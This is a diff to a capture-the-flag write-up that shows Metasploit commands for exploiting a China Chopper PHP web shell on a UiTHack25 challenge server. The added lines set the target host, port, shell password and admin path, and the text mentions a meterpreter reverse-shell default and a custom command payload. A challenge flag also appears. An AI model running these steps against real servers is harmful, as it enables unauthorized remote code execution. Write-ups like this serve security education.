@@ -56,6 +56,7 @@ Reading up on the China Chopper web shell, we learn several ways to exploit the 
 
 This method will only work if you have a public IP address or port forwarding set up on your router
 to forward the port to your machine, since the reverse shell will be blocked by the firewall.
+As such this is how it can be done if the website is run locally in docker.
 
 ```sh
 msf6 > use exploit/multi/http/caidao_php_backdoor_exec
@@ -97,7 +98,20 @@ UiTHack25{02_quota_revoked_please_submit_for_disposal}
 ```
 
 ### RCE exploit
+As with the reverse shell method we start out by choosing module and configuring it to target the admin panel.
 
+```sh
+msf6 > use exploit/multi/http/caidao_php_backdoor_exec
+[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
+msf6 exploit(multi/http/caidao_php_backdoor_exec) > set rhost uithack-2.td.org.uit.no
+rhost => uithack-2.td.org.uit.no
+msf6 exploit(multi/http/caidao_php_backdoor_exec) > set rport 9003
+rport => 9003
+msf6 exploit(multi/http/caidao_php_backdoor_exec) > set PASSWORD NEXUSANARCHY2337
+PASSWORD => NEXUSANARCHY2337
+msf6 exploit(multi/http/caidao_php_backdoor_exec) > set TARGETURI /admin/323d09c08a72717bbec71f172e5f6532.php
+TARGETURI => /admin/323d09c08a72717bbec71f172e5f6532.php
+```
 This method will work without any port forwarding, since the code will be executed on the server returning the output to the attacker.
 
 Check the available payloads with the `show payloads` command using the `caidao_php_backdoor_exec` module.
@@ -136,7 +150,7 @@ Compatible Payloads
 ```
 
 Most of the payloads are meterpreter payloads, which are not very useful in this case.
-We will use the `payload/php/exec` payload to execute a command on the server.
+We will use the `payload/generic/custom` payload to execute a command on the server.
 
 To get the output of the returned `POST` request, we first have to enable *HttpTrace*, and then set the payload and the command to execute.
 
